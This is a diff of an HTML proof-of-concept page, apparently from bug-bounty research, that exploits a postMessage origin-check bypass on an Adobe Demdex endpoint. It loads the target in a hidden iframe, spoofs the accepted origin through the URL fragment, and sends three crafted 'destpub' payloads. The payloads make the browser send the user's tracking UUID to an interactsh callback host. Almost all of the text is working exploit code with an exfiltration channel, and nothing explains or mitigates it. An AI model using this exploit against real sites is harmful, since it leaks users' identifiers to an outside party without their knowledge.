@@ -1,24 +1,16 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>PoC - Demdex postMessage Origin Bypass</title>
-</head>
+<head><title>PoC</title></head>
 <body>
   <h2>PoC Running...</h2>
-  <div id="status">Loading...</div>
+  <div id="status">Loading iframe...</div>
 
   <script>
-    // Sender origin = GitHub Pages (must match hash)
     var sender   = "https://elia874.github.io";
-
-    // Callback = interactsh (where UUID gets sent)
     var callback = "https://vqlgkysoxnjswaflcnwdnfne34x7tg7d0.oast.fun";
+    var target   = "https://dpm.demdex.net/dest4.html?d_nsid=0";
 
-    // Hash sets demdexOrigin = sender origin ✅
-    var target   = "https://adobe.demdex.net/dest4.html?d_nsid=0";
     var iframeURL = target + "#" + sender + "//elia874.github.io";
-
-    document.getElementById("status").innerText = "Iframe loading...";
 
     var iframe = document.createElement("iframe");
     iframe.style.display = "none";
@@ -26,27 +18,17 @@
     document.body.appendChild(iframe);
 
     iframe.onload = function () {
-      document.getElementById("status").innerText = "Iframe loaded! Sending payloads...";
+      document.getElementById("status").innerText = "Iframe loaded! Firing payloads...";
 
-      // Payload 1: Basic connectivity test
-      var p1 = "---destpub---dests|1|img|" + callback + "/?hit=1_basic|10080";
-
-      // Payload 2: UUID exfiltration
+      var p1 = "---destpub---dests|1|img|" + callback + "/?hit=basic|10080";
       var p2 = "---destpub---dests|2|img|" + callback + "/?uuid=%did%|10080";
-
-      // Payload 3: Debug mode
       var p3 = "---destpub-debug---dests|3|img|" + callback + "/?debug=1&uuid=%did%|10080";
 
-      iframe.contentWindow.postMessage(p1, sender);
-      iframe.contentWindow.postMessage(p2, sender);
-      iframe.contentWindow.postMessage(p3, sender);
+      iframe.contentWindow.postMessage(p1, "https://dpm.demdex.net");
+      iframe.contentWindow.postMessage(p2, "https://dpm.demdex.net");
+      iframe.contentWindow.postMessage(p3, "https://dpm.demdex.net");
 
-      document.getElementById("status").innerText = 
-        "✅ Payloads sent! Watch interactsh for: ?hit=1_basic and ?uuid=...";
-    };
-
-    iframe.onerror = function() {
-      document.getElementById("status").innerText = "❌ Iframe blocked!";
+      document.getElementById("status").innerText = "Payloads fired! Watch interactsh...";
     };
   </script>
 </body>
